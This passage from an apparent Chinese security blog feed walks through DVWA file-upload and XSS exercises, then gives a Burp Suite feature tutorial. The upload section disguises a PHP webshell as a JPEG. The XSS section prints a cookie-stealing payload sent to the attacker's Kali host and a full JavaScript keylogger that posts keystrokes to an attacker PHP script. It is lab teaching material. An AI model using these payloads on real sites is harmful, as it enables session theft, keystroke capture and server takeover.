从包头看到了一个MAX_FILE_SIZE还限制了文件大小为100000具体单位暂时不知，重点关注Content-Type，告诉客户端实际返回的内容的内容类型。<br>　　图中的是Content-Type: application/octet-stream，虽然具体不懂是啥意思，但一看这文件就不是图片，那么是不是可以手动改成图片类型呢，这个问题也问的好，当然可以。这里就介绍mimetype命令。<br>　　场景设想：如果一个文件原本是1.php，我手动改成1.jpg那么本质上来说它却是php文件，从我们肉眼上来说却是jpg。能骗到人，无法骗到我mimetype(txt以及其衍生文件.json等没有文件头，对这几个文件类型无效)。<br>　　先看看php类型的<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JUMhpF.png" alt="JUMhpF.png"><br>　　你说欺骗不了我mimetype，我这就试试将后缀名改为jpg格式<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JUM701.png" alt="JUM701.png"><br>　　此时mimetype笑了，所以利用mimetype命令可以很轻松的查看文件类型，这里查出png格式的类型为image/png。<br>　　回到burp，如下图更改数据<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JUlwrj.png" alt="JUlwrj.png"><br>　　发包后出现，上传失败<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/22/JUVIaD.png" alt="JUVIaD.png"><br>　　这就很尴尬了，是我操作有毛病吗，后来我尝试真正上传一张png图片的时候，确实不行。直到上传了一张jpg才发现可以。果断将格式改为image/jpeg<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/JdW0mD.png" alt="JdW0mD.png"><br>　　成功，还是看看源码吧<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/JdW57Q.png" alt="JdW57Q.png"><br>　　只允许jpg并且要小于100000(我们仍未知道那天所限制的文件大小的单位)<br>　　high级别，既然使用最高级别了，哪就使用杀手锏了吧。一般这种都会有后缀名判断加Content-Type，还有文件内容判断。<br>　　先试试改Content-Type和后缀名<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/Jd410S.png" alt="Jd410S.png"><br>　　发现是能直接上传，然后通过菜刀连接也能成功连上<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/Jd4gpR.png" alt="Jd4gpR.png"><br>　　这里必须还要配合文件解析漏洞，所以我们的php即使是jpg格式它还是php马。<br>　　你以为文件上传就这样结束了吗，当然没有，这次将一句话木马放在一个真正的jpg文件中。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/JdopSs.png" alt="JdopSs.png"><br>　　先上传一个真正的jpg文件，然后删除掉图片内容数据只保留前3行即可，插入一句话木马，改后缀名。因为前几行的数据是说明了此文件的类型，mimetype其实就是判断前几行的数据可知此文件的具体类型的。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/JdTIKI.png" alt="JdTIKI.png"><br>　　放包后成功上传，文件上传这一块知识点远远不止这点。。<br>　　我遇到一个真实的案例就是不管你上传的是什么后缀名的图片类型，如1.php.jpg 1.php.php.png 啥的反正不管你最后怎么改后缀。最后上传都变成xx.png，这也是防文件上传漏洞的一种方法。</p><h3 id="XSS-reflected"><a href="#XSS-reflected" class="headerlink" title="XSS reflected"></a>XSS reflected</h3><p>　　xss(跨站脚本攻击)，这一块的知识点是JavaScript的利用后面简称js。还是先说说原理，用户在像什么搜索栏，提交栏中输入恶意的js代码，注入进前端代码中，从而触发攻击。<br>　　low级别，emmm，我知道你懵逼，还是看案例，先输入一个hello后，查看burp的请求历史记录<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/Jdq4Ff.png" alt="Jdq4Ff.png"><br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/JdqLmn.png" alt="JdqLmn.png"><br>　　hello原封不动的在这对&lt;<span>pre&gt;&lt;</span>/pre&gt;标签中，如果你对js有一定的了解，那么下面一段代码你肯定再熟悉不过了，这次提交框输入&lt;<span>script&gt;alert(‘xss’)&lt;</span>/script&gt;。此语句的意思是弹出一个提醒框，内容为xss，提交后<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/JdLhu9.png" alt="JdLhu9.png"><br>　　还是看刚刚提交的请求历史包<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/JdLvDA.png" alt="JdLvDA.png"><br>　　发现它将这段我们提交的内容，当成html里面的语句来执行了，这就是xss，所以js就让我们在网页弹一个这个玩意吗？no，no这只是js语言的冰山一角而已，别小看js，曾经有个大佬用js写了一个操作系统。<br>　　言归正传，在这里先试试重定向页面。poc：&lt;<span>script&gt;window.location=”https://<span>w</span>ww.baidu.com”&lt;</span>/script&gt;,提交后就会跳转到百度。<br>　　获取cookie信息演示，先kali侦听80端口，nc -lvp 80，然后提交&lt;<span>script&gt;new Image().src=”http://<span></span>攻击者ip地址/c.php?output=”+document.cookie;&lt;</span>/script&gt;，如我kali的ip地址是192.168.2.161中间那段攻击者ip地址就是192.168.2.161。提交后。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/Jwp5tA.png" alt="Jwp5tA.png"><br>　　cookie信息一览无遗。<br>　　最后演示键盘记录器，创建3个文件分别为key.js keylog.txt keylogger.php都放在kali中的/var/www/html<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/JwiU3R.png" alt="JwiU3R.png"><br>　　key.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.onkeypress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>)</span>&#123;</span><br><span class="line">evt = evt || <span class="built_in">window</span>.event;</span><br><span class="line">key = <span class="built_in">String</span>.fromCharCode(evt.charCode);</span><br><span class="line"><span class="keyword">if</span>(key)&#123;</span><br><span class="line"><span class="keyword">var</span> http = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> param = <span class="built_in">encodeURI</span>(key);</span><br><span class="line">http.open(<span class="string">"POST"</span>,<span class="string">"http://192.168.2.161/keylogger.php"</span>,<span class="literal">true</span>);</span><br><span class="line">http.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">http.send(<span class="string">"key="</span>+param);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>　　keylogger.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = $_POST[<span class="string">'key'</span>];</span><br><span class="line">$logfile=<span class="string">"keylog.txt"</span>;</span><br><span class="line">$fp = fopen($logfile,<span class="string">"a"</span>);</span><br><span class="line">fwrite($fp,$key);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>　　keylog.txt是用来存储击键内容，然后开启kali的apach服务service apache2 start，先试试访问key.js能成功不<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/JwP711.png" alt="JwP711.png"><br>　　成功访问后，输入框提交&lt;<span>script src=”http://攻击者ip/key.js”&gt;&lt;/script</span>&gt;<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/JwF1xI.png" alt="JwF1xI.png"><br>　　除了输出一段hello外似乎无任何变化，但是只要你在这个页面上击键比如，随便输入qwer，在查看keylog内容后发现已经被记录，还是那句话这只是js功能的冰山一角。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/JwkpOP.png" alt="JwkpOP.png"><br>　　源码也是没啥过滤。补充一下这是反射性xss，刚才演示中可以看到要自己去点击提交后才能触发这些恶意行为，所以反射性xss一般都配合社会工程学，诱导对方去点击存在xss的网页链接，并且如果是要登陆的网页，对方还需要先登陆才行，和上面的csrf过程很像。一旦对方关闭了此网页后，攻击代码立刻失效。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/23/Jwkmyq.png" alt="Jwkmyq.png"><br>　　medium级别，先试试大写绕过，poc：&lt;<span>Script&gt;alert(‘xss’)&lt;/script</span>&gt;，成功弹窗。双写绕过，poc：&lt;scr&lt;<span>script&gt;ipt&gt;alert(‘xss’)&lt;/script</span>&gt;，其他html标签只要能加载js就行，poc：&lt;img src=”#” onerror=alert(“xss”)&gt;&lt;<span>/img</span>&gt;。还有非常多的姿势<br>　　源码：只是将&lt;<span>script</span>&gt;过滤掉<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/24/JDQIr8.png" alt="JDQIr8.png"><br>　　high级别，下无论你输入什么都会原封不动的返回出来。&lt;<span>script&gt;&lt;/script</span>&gt;它会吧它处理成正常的文本，而不是html标签语法。<br>　　<a href="https://imgchr.com/i/JD3rrV" target="_blank" rel="noopener"><img src data-echo="https://s1.ax1x.com/2020/04/24/JD3rrV.png" alt="JD3rrV.png"></a><br>　　源码<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/24/JD1aX6.png" alt="JD1aX6.png"><br>　　htmlspecialchars函数把预定义的字符转换为 HTML 实体。<br>　　&amp; （和号）成为 &amp;<br>　　“ （双引号）成为 “<br>　　‘ （单引号）成为 ‘<br>　　&lt; （小于）成为 &lt;<br>　　&gt; （大于）成为 &gt;<br>　　在这里不存在xss的情况，仅仅在这里而已，看插入代码的具体位置，这里输入的内容是一对括号之内的。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/24/JD8CdS.png" alt="JD8CdS.png"><br>　　而这个函数不会过滤’单引号，如果代码插入的位置是在如&lt;<span>a href=’你提交的内容’&gt;&lt;/a</span>&gt;，那么构造poc为’ onlick=’alert(xss)，代入进语句就是&lt;<span>a href=’’ onlick=’alert(xss)’&gt;&lt;/a</span>&gt;，这样也能成功执行xss，所以不能一概而论，要看具体的情况而定。</p><h3 id="XSS-stored"><a href="#XSS-stored" class="headerlink" title="XSS stored"></a>XSS stored</h3><p>　　存储型xss，这个意思是将xss注入进服务器中，反射性xss还要诱导对方来点击。而这个存储型xss你只需要睡一觉，等明天看有多少鱼儿上钩就完事。最经常见的例子就是留言板，你提交留言后，每个人都可以看见这条留言。所以你注入恶意js代码后，每个人只要点击查看留言那么它就中招了。<br>　　先正常提交一些数据。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/24/JDaoUP.png" alt="JDaoUP.png"><br>　　测试发现在Name，和message框输入到一定长度的时候就无法输入了。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/24/JDUGSe.png" alt="JDUGSe.png"><br>　　这个时候f12定位到输入框位置，看见一个maxlength=”50”，这个就是限制输入的长度，删除掉即可解除长度限制。<br>　　<a href="https://imgchr.com/i/JDUHX9" target="_blank" rel="noopener"><img src data-echo="https://s1.ax1x.com/2020/04/24/JDUHX9.png" alt="JDUHX9.png"></a><br>　　之后的攻击步骤都是跟上面的反射性xss都是一样的，提交后，先弹窗xss<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/24/JDaEAP.png" alt="JDaEAP.png"><br>　　然后f5刷新页面，发现又会弹窗xss<br>　　<a href="https://imgchr.com/i/JDavbn" target="_blank" rel="noopener"><img src data-echo="https://s1.ax1x.com/2020/04/24/JDavbn.png" alt="JDavbn.png"></a><br>　　点击左边的Setup，然后点击Create/Reset Database可以重置数据库信息，这样就会把我们前面注入的xss信息重置掉。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/24/JDdoL9.png" alt="JDdoL9.png"><br>　　如果换成窃取cookie信息，管理员一点开查看留言板，他的cookie就会被泄露。其他等级就不试了，无非就是绕过姿势。然后如果你又不懂js，而为了学xss又去专门花几个月时间系统学习了一下前端，感觉有点得不偿失。这时候BeEF登场了，它是一款专门配合xss漏洞的攻击框架，就看看界面，详细了解的话本篇不介绍。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/24/JD0EA1.png" alt="JD0EA1.png"><br>　　还有一个忘了说了，xss分三种类型，反射性xss，存储型xss前面都说过，剩下一个是dom型xss。还是前端有关的，dom对象，不了解，不多讲。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>　　对sql命令有多熟悉，就对sql注入有多了解，攻击面有多广。对js有多了解，就对xss攻击程度有多深。<br>　　互联网本来是安全的，自从有了研究安全的人之后，互联网就变得不安全了！</p><div style="text-align: right;">————《白帽子讲Web安全》</div>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burpsuite</title>
      <link href="/2020/03/29/48647.html"/>
      <url>/2020/03/29/48647.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　　Burp Suite 是一款非常优秀的抓包工具之一，渗透测试必备神器，本章不介绍最最最基本的抓包配置等等，只介绍常用功能。<br><a id="more"></a></p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>　　物理机: 192.168.2.213<br>　　靶　机: 192.168.2.123<br>　　K a l i  : 192.168.2.161</p><h3 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h3><h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><p>　　物理机无法抓靶机流量包，Kali能抓靶机流量包，但告知你必须要用物理机去抓到靶机流量包，怎样办？</p><h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h4><p>　　在Proxy-&gt;Options-&gt;Proxy Listeners-&gt;Add 添加代理侦听<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/JuwGFg.png" alt><br>　　设置绑定端口：随便设置 我设置为8080，设置绑定地址：我设置的是全网卡，直接ok选择yes后退出<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJmOe.png" alt><br>　　不抓本地包，所以去掉第一个选项卡<br>　　配置靶机中浏览器代理为物理机中的ip，端口为刚才设置的8080<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8dL4.png" alt><br>　　抓包成功,当然强大的burp也能抓手机包,本篇不介绍<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8uQS.png" alt></p><h4 id="options"><a href="#options" class="headerlink" title="options"></a>options</h4><p>　　只介绍Response Modification功能<br>　　设置用于执行自动响应的修改。可以使用这些选项通过自动重写应用程序响应的HTML来完成各种任务。 下列选项在数据删除客户端控件可能是有用的<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJR0J.png" alt><br>　　有些网页中是把表单隐藏了的<br>　　Unhide hidden form fields:显示隐藏的表单<br>　　　　Prominently highlight unhidden fields:高亮显示这些字段<br>　　有些表单是禁止输入内容的<br>　　Enable disabled form fields:启用禁用的表单<br>　　比如你输入密码框长度不能超过多少位，这个就可以突破<br>　　Remove input field length limits:移除输入字段长度限制<br>　　比如是否按正确的格式去输入<br>　　Remove JavaScript from validation:从验证中删除JavaScript<br>　　这个具体实际作用在哪里我也不知道<br>　　Remove secure flag from cookies:从cookies中删除安全标志<br>　　secure flag如图所示<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Juw2lR.png" alt></p><h3 id="导出项目"><a href="#导出项目" class="headerlink" title="导出项目"></a>导出项目</h3><p>　　最上面的选项卡Burp-&gt;Save copy of projec<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/JuwR61.png" alt><br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJW79.png" alt><br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJhkR.png" alt><br>　　再下一步就是选择保存位置和文件名称，点击保存就完成了</p><h3 id="导入项目"><a href="#导入项目" class="headerlink" title="导入项目"></a>导入项目</h3><p>　　写的够详细了，就不介绍了<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8heH.png" alt></p><h3 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h3><h4 id="site-map"><a href="#site-map" class="headerlink" title="site map"></a>site map</h4><p>　　当你抓取到了流量包后,会在target模块中生成站点地图,它采用树状的层次结构显示信息。<br>　　站点又分为两类:黑色和灰色<br>　　黑色:浏览器真正的对一个url发起了请求,服务器对它返回了响应信息<br>　　灰色:从页面中的url爬网爬出来的,并没有对该url的资源发生真正的访问一次。<br><img src data-echo="https://s1.ax1x.com/2020/04/18/JnJ9eJ.png" alt></p><table><thead><tr><th style="text-align:center">内容区域</th><th style="text-align:center">信息描述</th></tr></thead><tbody><tr><td style="text-align:center">左边</td><td style="text-align:center">站点层次目录</td></tr><tr><td style="text-align:center">中上</td><td style="text-align:center">此站点具体请求流量包历史</td></tr><tr><td style="text-align:center">中下</td><td style="text-align:center">此流量包具体数据内容(请求包,响应包)</td></tr><tr><td style="text-align:center">右上</td><td style="text-align:center">安全提示</td></tr><tr><td style="text-align:center">右下</td><td style="text-align:center">安全建议</td></tr></tbody></table><h4 id="scope"><a href="#scope" class="headerlink" title="scope"></a>scope</h4><p>　　查看当前站点过滤信息，当你想只查看某一个站点信息或者某个目录的时候，如下图所示选择要显示的站点，发送到scope去。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Juw3TS.png" alt><br>　　Include in scope:只查看当前列表中的站点信息=白名单<br>　　Exclude from scope:排除掉列表中的站点信息=黑名单<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJawj.png" alt></p><h4 id="site-map-filter"><a href="#site-map-filter" class="headerlink" title="site map filter"></a>site map filter</h4><p>　　单击filter哪一栏,会弹出过滤器规则,当你勾选好过滤规则后,只需要点击其他空白处,就会自动开始过滤<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJueH.png" alt><br>　　Show only in-scope items:仅显示范围内的站点(此处需搭配scope使用) 勾选后入图所示<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJtOg.png" alt><br>　　Show only requested items:仅显示真正发起请求的站点<br>　　Show only parameterizend requests:仅显示参数化的请求 也就是 过滤掉html,htm这类站点<br>　　Filter by search term:按关键词筛选 比如我只看url地址中包含了dvwa关键字<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Juwx78.png" alt><br>　　结果入图所示<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Juwv0f.png" alt><br>　　Filter by MIME type:按文件类型筛选<br>　　Filter by status code:按状态码筛选<br>　　Filter by file extension:按文件扩展名筛选<br>　　　　show only:展示asp,aspx,jsp,php等扩展名<br>　　　　Hide:不展示js,gif,jpg,png,css等扩展名<br>　　Filter by annotation:<br>　　　　Show only commented items:仅显示注释的项目<br>　　　　给url添加注释<br>　　　　<img src data-echo="https://s1.ax1x.com/2020/04/19/JuwJYQ.png" alt><br>　　　　添加完注释后<br>　　　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Juw40K.png" alt><br>　　　　Show only highlighted items:仅显示高亮的项目<br>　　　　点击host进行高亮设置<br>　　　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8WOe.png" alt><br>　　当你选乱的情况下,在Filter下面show all;hide all那一栏点击Revert changes:还原更改</p><h3 id="Spider"><a href="#Spider" class="headerlink" title="Spider"></a>Spider</h3><p>　　它提供爬虫功能，帮助来爬取网站目录结构<br>　　右键选择要爬取的主机或者分支发送到spider，它就会自动开始爬取网站<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJCw9.png" alt><br>　　如果遇到需要验证的表单，burp会自动弹出，知道就填上，提交选Submit form，忽略选Ignore form<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJPoR.png" alt></p><h4 id="control"><a href="#control" class="headerlink" title="control"></a>control</h4><p>　　在Spider-&gt;Control可以看见爬取的状态<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJ3fP.png" alt><br>　　Requests made:已经发送的请求<br>　　Bytes transferred:传输字节<br>　　Requests queued:请求的队列数量<br>　　Forms queued:正在排队的表单数量<br>　　点击Spider is running 后，暂停爬取，再次点击继续爬取<br>　　Clear queues:清除队列</p><h4 id="options-1"><a href="#options-1" class="headerlink" title="options"></a>options</h4><p>　　Spider-&gt;Options-&gt;Application Login 到申请登陆功能这里查看<br>　　默认选择Prompt for guidance即需要身份验证的时候就提示<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJFF1.png" alt><br>　　Don’t submit login forms:不要进行表单提交身份验证<br>　　Handle as ordinary forms:普通形式处理<br>　　Automatically submit these credentials:自动提交这些凭据 勾选后 它将自动将username和password里面的数据提交进表单<br>　　其他功能默认就行</p><h3 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h3><p>　　在进行scanner(漏洞扫描)前，先使用spider功能，这样可以最大限度发现漏洞<br>　　右键选择分支或者主机，选择主动扫描，没有搞懂被动扫描有什么用<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/JuwYWj.png" alt><br>　　这时会弹出主动扫描向导<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/JuwNSs.png" alt><br>　　最后一个选项Remove items with the follwing extensions:以下扩展名的不扫描。没必要扫这些勾选上<br>　　直接Next-&gt;Ok就开始进行扫描</p><h4 id="Scan-queue"><a href="#Scan-queue" class="headerlink" title="Scan queue"></a>Scan queue</h4><p>　　此处查看扫描队列的详细进度<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJ0kn.png" alt><br>　　Issues颜色级别<br>　　High:红色    Medium:橙色    Low:黄色    Information:深灰色</p><h4 id="Issue-activity"><a href="#Issue-activity" class="headerlink" title="Issue activity"></a>Issue activity</h4><p>　　此功能是查看具体安全报告信息<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJ5fx.png" alt><br>　　上面一部分</p><table><thead><tr><th style="text-align:center">Action</th><th style="text-align:center">Issue type</th><th style="text-align:center">Host</th><th style="text-align:center">Path</th><th style="text-align:center">Insertion point</th><th style="text-align:center">Severtity</th><th style="text-align:center">Confidence</th></tr></thead><tbody><tr><td style="text-align:center">行为</td><td style="text-align:center">问题类型</td><td style="text-align:center">主机</td><td style="text-align:center">路径</td><td style="text-align:center">插入点</td><td style="text-align:center">严重程度</td><td style="text-align:center">确信程度  </td></tr></tbody></table><p>　　Confidence(信任度由高到低):  Certain&gt;Firm &gt;Tentative<br>　　下面一部分<br>　　给出漏洞修补建议,即漏洞细节和漏洞背景,还有一如既往的请求包和响应包</p><h4 id="options-2"><a href="#options-2" class="headerlink" title="options"></a>options</h4><h5 id="Attack-Insertion-Points"><a href="#Attack-Insertion-Points" class="headerlink" title="Attack Insertion Points"></a>Attack Insertion Points</h5><p>　　change parameter locatons:更改参数的位置<br>　　这些都勾选上，比如url里面的内容放到cookie，逐一检查<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJ2m4.png" alt><br>　　第二个划红线的意思是发现隐蔽的命令注入点，如url中的base64编码，解码后发现是xml的值或者json，ajax等客户端对象存储的数据</p><h5 id="Active-Scanning-Engine"><a href="#Active-Scanning-Engine" class="headerlink" title="Active Scanning Engine"></a>Active Scanning Engine</h5><p>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJop6.png" alt></p><h5 id="Active-Scanning-Optimization"><a href="#Active-Scanning-Optimization" class="headerlink" title="Active Scanning Optimization"></a>Active Scanning Optimization</h5><p>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJdTs.png" alt><br>　　Scan speed:扫描速度<br>　　扫描仔细度:Thorough &gt; Normal &gt; Fast<br>　　Normal:正常速度    Fast:快    Thorough:彻底扫描<br>　　Scan accuracy:扫描精度<br>　　Normal:正常精度    Minimize false negatives:最小漏判(追求扫描最多漏洞数量时选择)    Minimize false positives:最小误报(追求扫描结果准确性时选择)</p><h3 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h3><p>　　Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。<br>　　在请求包或者响应包都能右键Send to Intruder<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJBYq.png" alt></p><h4 id="positions"><a href="#positions" class="headerlink" title="positions"></a>positions</h4><p>　　在positions选项卡下可以看见burp默认标记了一些变量<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8gSK.png" alt><br>　　先Clear$掉清除变量，这里演示爆破用户名和密码，点击右边的Add$分别将admin和password设置为变量，后面再攻击的时候它将循环替换此处变量内容，从而达到暴力破解<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju86W6.png" alt><br>　　这里的攻击类型有四种分别是：Sniper(狙击手)、Battering ram(攻城槌)、Pitchfork(杈子)、Cluster bomb(集束炸弹)，稍后会讲，在攻击前先设置Payloads<br>　　如果你要爆破后台的话，将url作为变量也未尝不可以，一句话任何内容都可以设置为变量<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8oFI.png" alt></p><h4 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h4><p>　　　选择不同的类型下图中的payload设置也会不同，常用的类型Simple list<br>　　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8sF1.png" alt><br>　　　后面的攻击类型的字典我都会用下图<br>　　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8DoR.png" alt><br>　　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8TYt.png" alt><br>　　　你可以手动添加内容，如上图所示，按回车或者点击Add。或者点击Load从文件中选择一个字典，或者选择burp内置的字典。<br>　　　也可以对payload加工变形，点击Add添加变形类型<br>　　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8Bw9.png" alt><br>　　　仅介绍几个    设payload 有 name admin 两个<br>　　　Add prefix:添加前缀 如添加user后　　payload为:username,useradmin<br>　　　Add suffix:添加后缀 如添加1234后     　payload为:name1234,admin1234<br>　　　Match/replace:匹配/替换　如Match regex:m　Replace with:6 后<br>　　　payload为:na6e,ad6in</p><hr><p>　　　Payload Options设置好后就可以点击Start Attack<br>　　　然后介绍几个payload type<br>　　　<b>Numbers</b><br>　　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju80eJ.png" alt><br>　　　<b>Brute forcer</b><br>　　　它是将最小字符到最大字符直接从攻击字符中随便挑选几个字符，比如我这里设置的是4个字符，那么它就会随便挑选4个字符，将所有情况都会尝试，是一种非常暴力的攻击，从图中可以看出有3359232种情况<br>　　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8yJx.png" alt></p><h4 id="Sniper-狙击手"><a href="#Sniper-狙击手" class="headerlink" title="Sniper(狙击手)"></a>Sniper(狙击手)</h4><p>　　此类型先将列表中的内容，先替换变量１的值，不改变变量２的值。然后尝试完后，再将列表中的内容替换变量２的值，不改变变量１的值。有第三个变量的话，以此类推。<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJlFI.png" alt></p><hr><p>　　<img src data-echo="https://s1.ax1x.com/2020/04/18/JnJ1Yt.png" alt></p><h4 id="Battering-ram-攻城槌"><a href="#Battering-ram-攻城槌" class="headerlink" title="Battering ram(攻城槌)"></a>Battering ram(攻城槌)</h4><p>　　此类型是将列表中的内容替换所有变量<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Juwhm6.png" alt></p><h4 id="Pitchfork-杈子"><a href="#Pitchfork-杈子" class="headerlink" title="Pitchfork(杈子)"></a>Pitchfork(杈子)</h4><p>　　此类型将会设置两个Payload Sets 两个列表中的内容按顺序成对替换<br>　　Payload1设置<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8JJ0.png" alt></p><hr><p>　　Payload2设置<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8Giq.png" alt><br>　　可以看出payload1比payload2内容多了一行，前面说过是成对出现，所以你猜开始攻击后会怎么提交payload？<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8ayF.png" alt><br>　　所以没有匹配内容后就停止发包了</p><h4 id="Cluster-bomb-集束炸弹"><a href="#Cluster-bomb-集束炸弹" class="headerlink" title="Cluster bomb(集束炸弹)"></a>Cluster bomb(集束炸弹)</h4><p>　　此类型是真的全面，举例payload1 有username，admin。payload2有password，passwd，攻击的payload为username password、username passwd、admin password、admin passwd<br>　　payload1 和 payload2不变，依然使用上次的设置，开始攻击<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Juwgp9.png" alt><br>　　此类型和Sniper(狙击手)是经常使用的</p><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><p>　　当请求过于杂而多时，这时候筛选器就登场了，设置好后点击其他任意位置后，开始自动筛选<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Ju8UQU.png" alt></p><h4 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h4><h5 id="列子1"><a href="#列子1" class="headerlink" title="列子1"></a>列子1</h5><p>　　此处题目来自于<a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=0&amp;id=5069&amp;page=1" target="_blank" rel="noopener">攻防世界</a><br>　　截断靶机请求包，发送进intruder<br>　　<img src data-echo="https://s1.ax1x.com/2020/04/19/Juwayq.png" alt><br>　　选择Cluster bomb攻击类型，设置好变量，配置payload<br>　　<img src 